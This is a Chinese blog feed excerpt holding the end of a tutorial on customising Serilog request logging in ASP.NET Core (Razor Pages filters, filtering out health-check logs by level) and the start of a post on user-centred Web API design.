<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SerilogLoggingPageFilter</span> : <span class="title">IPageFilter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">readonly</span> IDiagnosticContext _diagnosticContext;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SerilogLoggingPageFilter</span>(<span class="params">IDiagnosticContext diagnosticContext</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        _diagnosticContext = diagnosticContext ?? <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="keyword">nameof</span>(diagnosticContext));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//Required by the interface</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnPageHandlerExecuted</span>(<span class="params">PageHandlerExecutedContext context</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnPageHandlerExecuting</span>(<span class="params">PageHandlerExecutingContext context</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnPageHandlerSelected</span>(<span class="params">PageHandlerSelectedContext context</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> name = context.HandlerMethod?.Name ?? context.HandlerMethod?.MethodInfo.Name;</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            _diagnosticContext.Set(<span class="string">"RazorPageHandler"</span>, name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;请注意，我们之前编写的<code>IActionFilter</code>代码<strong>不会</strong>在 Razor Pages 上运行，因此，如果您也想记录 RazorPages <code>RouteData</code>或<code>ValidationState</code>等的其他详细信息，则也需要在此处添加它。该<code>context</code>属性包含您可能需要的大多数属性，例如<code>ModelState</code>和<code>ActionDescriptor</code>。</p>
<p>&emsp;&emsp;接下来，您需要在<code>Startup.ConfigureServices()</code>方法中注册页面过滤器：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//services.AddMvcCore(</span></span><br><span class="line">    <span class="comment">//    opts =&gt; opts.Filters.Add&lt;SerilogLoggingPageFilter&gt;()</span></span><br><span class="line">    <span class="comment">//    );</span></span><br><span class="line">    services.AddRazorPages().AddMvcOptions(</span><br><span class="line">        opts =&gt; opts.Filters.Add&lt;SerilogLoggingPageFilter&gt;()</span><br><span class="line">        ) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;添加过滤器后，对 “Razor 页面”的请求现在可以看到添加的附加属性，<code>IDiagnosticContext</code>这些属性将添加到 Serilog 请求日志中。请参见下图中的<code>RazorPageHandler</code>属性：</p>
<figure class="image-box">
                <img src="7.png" alt title class>
                <p></p>
            </figure>

<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;默认情况下，当用 Serilog 的请求日志记录中间件替换 ASP.NET Core 基础结构中的日志记录时，您会丢失一些信息（与开发环境的默认配置相比）。在本文中，我将展示如何自定义 Serilog，<code>RequestLoggingOptions</code>以重新添加特定于 MVC 的其他属性。<br>&emsp;&emsp;要将与 MVC 相关的属性添加到 Serilog 请求日志中，请创建一个<code>IActionFilter</code>并使用<code>IDiagnosticContext.Set()</code>来添加属性。要将与 Razor 页面相关的属性添加到 Serilog 请求日志中，请在<code>IPageFilter</code>中使用<code>IDiagnosticContext</code>的相同方法创建和添加属性。</p>
<p>&emsp;&emsp;下一节让我们一起探讨下如何从 Serilog 请求记录中排除运行状况检查端点。</p>
<hr>
<h1 id="从-Serilog-请求日志记录中排除健康检查端点"><a href="#从-Serilog-请求日志记录中排除健康检查端点" class="headerlink" title="从 Serilog 请求日志记录中排除健康检查端点"></a>从 Serilog 请求日志记录中排除健康检查端点</h1><p>&emsp;&emsp;在本系列的前几篇文章中，我描述了如何配置 Serilog 的 RequestLogging 中间件以向 Serilog 的请求日志摘要中添加附加属性，例如请求主机名或选定的端点名称。我还展示了如何使用过滤器将 MVC 或 RazorPage 特定的属性添加到摘要日志。<br>&emsp;&emsp;在本文中，我将展示如何过滤掉某个特定请求的摘要日志消息。当您有一个访问比较频繁的端点时，这非常有用，因为为每个请求都进行记录几乎没有什么价值。</p>
<h2 id="健康检查访问较频繁"><a href="#健康检查访问较频繁" class="headerlink" title="健康检查访问较频繁"></a>健康检查访问较频繁</h2><p>&emsp;&emsp;这篇文章的动机来自我们在 Kubernetes 中运行应用程序时看到的行为。Kubernetes 使用两种类型的“健康检查”（或“探针”）来检查应用程序是否正常运行：liveness probes 和 readiness probes。您可以将探测配置为向应用程序发出 HTTP 请求，作为应用程序正常运行的指示器。</p>
<blockquote>
<p>&emsp;&emsp;从 Kubernetes 1.16 版开始，存在第三种探针，即 <a href="https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/#define-startup-probes" target="_blank" rel="noopener">startup probe</a>。</p>
</blockquote>
<p>&emsp;&emsp;在 ASP.NET Core 2.2+ 中提供的<a href="https://docs.microsoft.com/en-us/aspnet/core/host-and-deploy/health-checks" target="_blank" rel="noopener">健康检查终结点</a>非常适合这些探针。您可以设置一个简单，没有任何返回值的健康检查，该健康检查对每个请求返回<code>200 OK</code>的响应，以使 Kubernetes 知道您的应用程序没有崩溃。<br>&emsp;&emsp;在 ASP.NET Core 3.x 中，可以使用终结点路由来配置健康检查。您必须在 <em>Startup.cs</em> 中的<code>ConfigureServices</code>中通过调用<code>AddHealthChecks()</code>来添加必须的服务，并在<code>Configure</code>中使用<code>MapHealthChecks()</code>来添加健康检查终结点：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Startup</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ConfigureServices</span>(<span class="params">IServiceCollection services</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// ..other service configuration</span></span><br><span class="line"></span><br><span class="line">        services.AddHealthChecks(); <span class="comment">// Add health check services</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="comment">// .. other middleware</span></span><br><span class="line">        app.UseRouting();</span><br><span class="line">        app.UseAuthorization();</span><br><span class="line">        app.UseEndpoints(endpoints =&gt;</span><br><span class="line">        &#123;</span><br><span class="line">            endpoints.MapHealthChecks(<span class="string">"/health"</span>); <span class="comment">//Add health check endpoint</span></span><br><span class="line">            endpoints.MapControllers();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;在上面的示例中，向<code>/healthz</code>发送请求将调用运行状况检查终结点。由于我没有配置任何运行的健康检查，因此只要应用程序正在运行，端点将始终返回<code>200</code>响应：</p>
<figure class="image-box">
                <img src="8.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;这里存在的唯一的问题是 Kubernetes 将非常频繁的调用这个终结点。当然，确切的频率由您决定，但每 10 秒检查一次应该是很常见的。但是如果你想让 Kubernetes 可以快速重启有故障的 Pod 的话，您就需要一个相对较高的频率了。<br>&emsp;&emsp;这本身不是问题；Kestrel 每秒可以处理数百万个请求，因此这不是性能问题。这里令人比较烦恼的问题是每个请求都会生成一定数量的日志。虽然它<a href="https://www.cnblogs.com/yilezhu/p/12215934.html" target="_blank" rel="noopener">没有 MVC 基础架构的请求所示的那么多 —— 每个请求 10 个日志</a>，但是即使每个请求只有 1 个日志（就像我们从 Serilog.AspNetCore 获得的那样）都可能会令人不快。<br>&emsp;&emsp;这里的主要问题是成功进行健康检查请求的日志实际上并未告诉我们任何有用的信息。它们与任何业务活动都不相关，它们纯粹是基础设施。这里如果能够跳过这些请求的 Serilog 请求摘要日志会很好。在下一部分中，我将介绍我所想出的方法，该方法依赖于本系列前面几篇文章的内容，并在其基础上做出更改。</p>
<h2 id="定制用于-Serilog-请求日志的日志级别"><a href="#定制用于-Serilog-请求日志的日志级别" class="headerlink" title="定制用于 Serilog 请求日志的日志级别"></a>定制用于 Serilog 请求日志的日志级别</h2><p>&emsp;&emsp;在上一篇文章中，我展示了如何在 Serilog 请求日志中包括<a href="https://docs.microsoft.com/en-us/aspnet/core/fundamentals/routing?view=aspnetcore-3.0#endpoint-routing-differences-from-earlier-versions-of-routing" target="_blank" rel="noopener">所选终结点</a>。我的方法是在注册 Serilog 中间件时为<code>RequestLoggingOptions.EnrichDiagnosticContext</code>属性提供一个自定义函数：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... Other middleware</span></span><br><span class="line"></span><br><span class="line">    app.UseSerilogRequestLogging(opts</span><br><span class="line">        <span class="comment">// EnrichFromRequest helper function is shown in the previous post</span></span><br><span class="line">        =&gt; opts.EnrichDiagnosticContext = LogHelper.EnrichFromRequest); </span><br><span class="line"></span><br><span class="line">    app.UseRouting();</span><br><span class="line">    app.UseAuthorization();</span><br><span class="line">    app.UseEndpoints(endpoints =&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        endpoints.MapHealthChecks(<span class="string">"/healthz"</span>); <span class="comment">//Add health check endpoint</span></span><br><span class="line">        endpoints.MapControllers();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;<code>RequestLoggingOptions</code>具有另一个属性，<code>GetLevel</code>该属性的<code>Func&lt;&gt;</code>被用于确定应用于给定请求日志的日志记录级别。默认情况下，<a href="https://github.com/serilog/serilog-aspnetcore/blob/dev/src/Serilog.AspNetCore/SerilogApplicationBuilderExtensions.cs#L31-L36" target="_blank" rel="noopener">它设置为以下功能</a>：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">SerilogApplicationBuilderExtensions</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> LogEventLevel <span class="title">DefaultGetLevel</span>(<span class="params">HttpContext ctx, <span class="keyword">double</span> _, Exception ex</span>)</span> =&gt;</span><br><span class="line">        ex != <span class="literal">null</span></span><br><span class="line">            ? LogEventLevel.Error </span><br><span class="line">            : ctx.Response.StatusCode &gt; <span class="number">499</span> </span><br><span class="line">                ? LogEventLevel.Error </span><br><span class="line">                : LogEventLevel.Information;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;此函数检查是否为请求引发了异常，或者响应代码是否为<code>5xx</code>错误。如果是这样，它将创建一个<code>Error</code>级别的摘要日志，否则将创建一个<code>Information</code>级别日志。</p>
<p>&emsp;&emsp;假设您希望将摘要日志记录为<code>Debug</code>而不是<code>Information</code>。首先，您将创建一个具有以下所需逻辑的辅助函数，如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">LogHelper</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LogEventLevel <span class="title">CustomGetLevel</span>(<span class="params">HttpContext ctx, <span class="keyword">double</span> _, Exception ex</span>)</span> =&gt;</span><br><span class="line">        ex != <span class="literal">null</span></span><br><span class="line">            ? LogEventLevel.Error </span><br><span class="line">            : ctx.Response.StatusCode &gt; <span class="number">499</span> </span><br><span class="line">                ? LogEventLevel.Error </span><br><span class="line">                : LogEventLevel.Debug; <span class="comment">//Debug instead of Information</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;然后，您可以在调用时设置级别功能<code>UseSerilogRequestLogging()</code>：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... Other middleware</span></span><br><span class="line"></span><br><span class="line">    app.UseSerilogRequestLogging(opts =&gt; &#123;</span><br><span class="line">        opts.EnrichDiagnosticContext = LogHelper.EnrichFromRequest;</span><br><span class="line">        opts.GetLevel = LogHelper.CustomGetLevel; <span class="comment">// Use custom level function</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//... other middleware</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;现在，您的请求摘要日志将全部记录为<code>Debug</code>，除非发生错误（<a href="https://datalust.co/seq/" target="_blank" rel="noopener">Seq</a> 的屏幕截图）：</p>
<figure class="image-box">
                <img src="9.png" alt title class>
                <p></p>
            </figure>

<p>&emsp;&emsp;但这如何解决我们的冗长日志的问题呢？</p>
<p>&emsp;&emsp;当你在配置 Serilog 时，你通常应该会定义一个最低请求级别。例如，以下简单配置将默认级别设置为<code>Debug()</code>，并将其写入控制台接收器：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Log.Logger = <span class="keyword">new</span> LoggerConfiguration()</span><br><span class="line">    .MinimumLevel.Debug()</span><br><span class="line">    .WriteTo.Console()</span><br><span class="line">    .CreateLogger();</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;因此，过滤日志的最简单方法是使日志级别低于<code>MinimumLevel</code>记录器配置中指定的级别。一般而言，如果使用最低级别<code>Verbose</code>，它将几乎总是被过滤掉。<br>&emsp;&emsp;困难之处在于我们不想总是将<code>Verbose</code>用作摘要日志的日志级别。如果这样做，我们将不会获得任何非错误的请求日志，而 Serilog 中间件将变得毫无意义！<br>&emsp;&emsp;相反，我们希望将日志级别设置为<code>Verbose</code><strong>仅</strong>针对运行健康检查端点的请求。在下一节中，我将展示如何在不影响其他请求的情况下识别这些请求。</p>
<h2 id="将自定义日志级别用于健康检查终结点请求"><a href="#将自定义日志级别用于健康检查终结点请求" class="headerlink" title="将自定义日志级别用于健康检查终结点请求"></a>将自定义日志级别用于健康检查终结点请求</h2><p>&emsp;&emsp;我们需要的是能够在写入摘要日志时识别出健康检查的请求的能力。如前所示，该<code>GetLevel()</code>方法将当前<code>HttpContext</code>作为参数，因此理论上有一些可行性。对我来说，最明显的做法是：</p>
<ul>
<li>将<code>HttpContext.Request</code>路径与已知的健康检查路径列表进行比较</li>
<li>当健康检查终结点被请求时，使用选定的端点元数据来进行标识</li>
</ul>
<p>&emsp;&emsp;第一种选择是最明显的，但是它真的不值得尝试。一旦你陷入其中，你会发现你必须开始复制请求路径并处理各种边缘情况，因此在这里我将跳过该情况。<br>&emsp;&emsp;第二种方法使用了与我上一篇文章中使用的方法类似，在该方法中，我们获得了<code>EndpointRoutingMiddleware</code>为给定请求选择的<code>IEndpointFeature</code>。此功能（如果存在）提供了所选端点的显示名称和路由数据等详细信息。</p>
<p>&emsp;&emsp;如果我们假设健康检查是<a href="https://github.com/aspnet/AspNetCore/blob/master/src/Middleware/HealthChecks/src/Builder/HealthCheckEndpointRouteBuilderExtensions.cs#L18" target="_blank" rel="noopener">使用默认显示名称注册</a>的，即”<code>Health checks</code>“，则我们可以使用<code>HttpContext</code>来标识“健康检查”的请求，如下所示：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">LogHelper</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">IsHealthCheckEndpoint</span>(<span class="params">HttpContext ctx</span>)</span></span><br><span class="line"><span class="function"></span>    &#123;</span><br><span class="line">        <span class="keyword">var</span> endpoint = ctx.GetEndpoint();</span><br><span class="line">        <span class="keyword">if</span> (endpoint <span class="keyword">is</span> <span class="keyword">object</span>) <span class="comment">// same as !(endpoint is null)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">string</span>.Equals(</span><br><span class="line">                endpoint.DisplayName, </span><br><span class="line">                <span class="string">"Health checks"</span>,</span><br><span class="line">                StringComparison.Ordinal);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// No endpoint, so not a health check endpoint</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;我们可以将此功能与<a href="https://github.com/serilog/serilog-aspnetcore/blob/dev/src/Serilog.AspNetCore/SerilogApplicationBuilderExtensions.cs#L31-L36" target="_blank" rel="noopener">默认<code>GetLevel</code>功能</a>的自定义版本结合使用，以确保运行健康检查请求的摘要日志使用<code>Verbose</code>级别，当发生错误时使用<code>Error</code>而其他请求则使用<code>Information</code>：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">LogHelper</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> LogEventLevel <span class="title">ExcludeHealthChecks</span>(<span class="params">HttpContext ctx, <span class="keyword">double</span> _, Exception ex</span>)</span> =&gt; </span><br><span class="line">        ex != <span class="literal">null</span></span><br><span class="line">            ? LogEventLevel.Error </span><br><span class="line">            : ctx.Response.StatusCode &gt; <span class="number">499</span> </span><br><span class="line">                ? LogEventLevel.Error </span><br><span class="line">                : IsHealthCheckEndpoint(ctx) <span class="comment">// Not an error, check if it was a health check</span></span><br><span class="line">                    ? LogEventLevel.Verbose <span class="comment">// Was a health check, use Verbose</span></span><br><span class="line">                    : LogEventLevel.Information;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这个嵌套的三目运算符有一个额外的逻辑 —— 对于无错误，我们检查是否选择了显示名为 “Health check” 的端点，如果选择了，则使用级别<code>Verbose</code>，否则使用<code>Information</code>。</p>
<blockquote>
<p>&emsp;&emsp;您可以进一步推广此代码，以允许传入其他显示名称或其他自定义使用的日志级别。为了简单起见，我在这里没有这样做，但是 <a href="https://github.com/andrewlock/blog-examples/tree/master/SerilogRequestLogging" target="_blank" rel="noopener">GitHub 上的相关示例代码显示了如何执行此操作</a>。</p>
</blockquote>
<p>&emsp;&emsp;剩下的就是更新 Serilog 中间件<code>RequestLoggingOptions</code>以使用您的新功能：</p>
<figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Configure</span>(<span class="params">IApplicationBuilder app, IWebHostEnvironment env</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// ... Other middleware</span></span><br><span class="line"></span><br><span class="line">    app.UseSerilogRequestLogging(opts =&gt; &#123;</span><br><span class="line">        opts.EnrichDiagnosticContext = LogHelper.EnrichFromRequest;</span><br><span class="line">        opts.GetLevel = LogHelper.ExcludeHealthChecks; <span class="comment">// Use the custom level</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//... other middleware</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;这时候当你运行应用程序后检查日志时，您会看到标准请求的普通请求日志，但没有健康检查的日志（除非发生错误！）。在下面的屏幕截图中，我将 Serilog 配置为也记录<code>Verbose</code>日志，以便您可以查看运行状况检查请求 —— 通常会将它们过滤掉！</p>
<figure class="image-box">
                <img src="10.png" alt title class>
                <p></p>
            </figure>

<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>&emsp;&emsp;在本文中，我展示了如何为 Serilog 中间件的<code>RequestLoggingOptions</code>提供一个自定义函数，该函数定义了要为给定请求的日志使用的<code>LogEventLevel</code>。例如，我展示了如何使用它将默认级别更改为 Debug。如果您选择的级别低于最低级别，它将被完全过滤掉，并且不会被记录。<br>&emsp;&emsp;我还展示了您可以使用这种方法来过滤通过调用健康检查端点生成的公共（低级别的）请求日志。一般来说，这些请求只有在指出问题时才有意义，但它们通常也会在成功时生成请求日志。由于这些端点被频繁调用，因此它们可以显著增加写入的日志数量（无用）。<br>&emsp;&emsp;本文中的方法是检查选定的<code>IEndpointFeature</code>并检查它是否具有显示名称 “Health checks”。如果是，请求日志将使用<code>Verbose</code>级别写入，这通常会被过滤掉。为了更灵活，您可以自定义在这个帖子中显示的日志来处理多个端点名称，或者任何其他的标准。</p>
]]></content>
      
        <categories>
            
            <category> 编程 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSharp </tag>
            
            <tag> ASPNETCore </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[使用 OAS（OpenAPI 标准）来描述 Web API]]></title>
      <url>/2020/01/20/UseOasToDescribeWebApi/</url>
      <content type="html"><![CDATA[<blockquote>
<p><a href="https://www.cnblogs.com/cgzl/p/12217617.html" target="_blank" rel="noopener">https://www.cnblogs.com/cgzl/p/12217617.html</a></p>
</blockquote>
<a id="more"></a>

<p>&emsp;&emsp;无论哪种类型的 Web API 都可能需要给其他开发者使用，所以 API 的开发者体验是很重要的。API 的开发者体验，简写为 API DX（Developer Experience），它包含很多东西。例如如何使用 API、文档、技术支持等等，但是最重要的还是 API 的设计。如果 API 设计的不好，那么使用该 API 构建的软件就需要增加在时间、人力、金钱等方面的投入。有时候 API 会被错用，甚至带来毁灭性后果。最后抱怨该 API 的用户越来越多，慢慢地，客户就会停止使用该 API。<br>&emsp;&emsp;API 的目的是让人们可以简单的使用它来达到自己的目的。目前行业内有很多 API 风格，例如：REST、gRPC、GraphQL、SOAP、RPC 等等。但是每个风格都遵循一些基本的设计原则。</p>
<h1 id="用户就是上帝，为用户设计-API"><a href="#用户就是上帝，为用户设计-API" class="headerlink" title="用户就是上帝，为用户设计 API"></a>用户就是上帝，为用户设计 API</h1><p>&emsp;&emsp;和构建任何东西一样，你需要一个计划，你需要在真正做之前来决定你想要的是什么。API 设计也是一样的。<br>&emsp;&emsp;API 并不是用来盲目地暴露一些数据或业务处理能力。它就像我们每天使用的任何形式的接口一样，例如微波炉的操作按钮，是来帮助用户完成他们的目标的。所以需要从用户的视角来决定一个 API 的设计目标。在整个设计过程中，必须牢记以用户的视角去设计，如果以开发者的角度去设计，那么问题就大了。<br>&emsp;&emsp;如果以开发者的视角去设计 API，那么通常的后果是开发出的 API 会很注重功能实现的过程和原理，而不是用户如何能简单平滑地使用这个 API 来达到他们的目的。所以一定要注重用户的需求，而不要让内部实现细节、原理什么的来骚扰用户。最后再次强调，要设计出让用户容易理解和容易使用的 API。<br>&emsp;&emsp;所以 API 就是用户看到的，它表示出用户能使用它做什么。API 的实现细节，也就是如果完成的该功能的细节，需要对用户隐藏。</p>
<h1 id="识别-API-的目标"><a href="#识别-API-的目标" class="headerlink" title="识别 API 的目标"></a>识别 API 的目标</h1><p>&emsp;&emsp;记住首先考虑用户的感受之后，下面就需要考虑用户能拿它来做什么了，也就是识别 API 的目标。</p>
<p>&emsp;&emsp;识别 API 的目标，最基本的要对以下方面有深刻、精准的认识：</p>
<ol>
<li>Who，谁可以使用这个API？ </li>
<li>What，用户拿这个API能做什么事？  </li>
<li>How，用户如何做这件事？ </li>
<li>What need，用户想要做这件事的话还需要什么？ </li>
<li>What return，用户会得到什么？ </li>
</ol>
<p>&emsp;&emsp;1 就是指 API 的用户，4、5 分别表示输入输出。  </p>
<h2 id="针对-2、3-解释一下"><a href="#针对-2、3-解释一下" class="headerlink" title="针对 2、3 解释一下"></a>针对 2、3 解释一下</h2><p>&emsp;&emsp;通常针对 2. What（用户拿 API 能做什么）可以导致（分解）多个 3. How（多个步骤），这样的话每个步骤就是一个 API 的目标。<br>&emsp;&emsp;比如说，用户想去淘宝买一个商品，那么怎么买？首先需要把商品添加到购物车，然后再结账。那么这个 API 就应该有两个目标：添加商品到购物车 以及 结账。<br>&emsp;&emsp;如果不这样分解到话，通常设计出的 API 会缺失一些目标。 </p>
<h2 id="针对1，也解释一下"><a href="#针对1，也解释一下" class="headerlink" title="针对1，也解释一下"></a>针对1，也解释一下</h2><p>&emsp;&emsp;首先应该识别出不同种类的用户，这里的用户可能是人，也可能是其他的程序。通常通过检查输入和输出就可以识别出用户。 </p>
<p>&emsp;&emsp;总结一下就 6 个方面： </p>
<ul>
<li>用户 </li>
<li>能做什么 </li>
<li>如何做 - 分解步骤 </li>
<li>输入 </li>
<li>输出 </li>
<li>目标 </li>
</ul>
<h1 id="避免从开发者角度设计-API"><a href="#避免从开发者角度设计-API" class="headerlink" title="避免从开发者角度设计 API"></a>避免从开发者角度设计 API</h1><p>&emsp;&emsp;这部分包含几个方面，包括： </p>
<ul>
<li>开发者所在公司的组织结构（参考康威定律）；</li>
<li>数据，例如数据使用了开发者所在公司内部的一些专有术语，或者干脆把内部数据库模型暴露了出来；</li>
<li>不要暴露实现细节，避免受到业务逻辑实现细节的影响；</li>
<li>避免受到软件架构的影响，比如说在开发者公司内部查询产品名称和产品价格是两个 API，那么给用户使用的 API 必须整合一下，不能让用户分两步查询。 </li>
</ul>
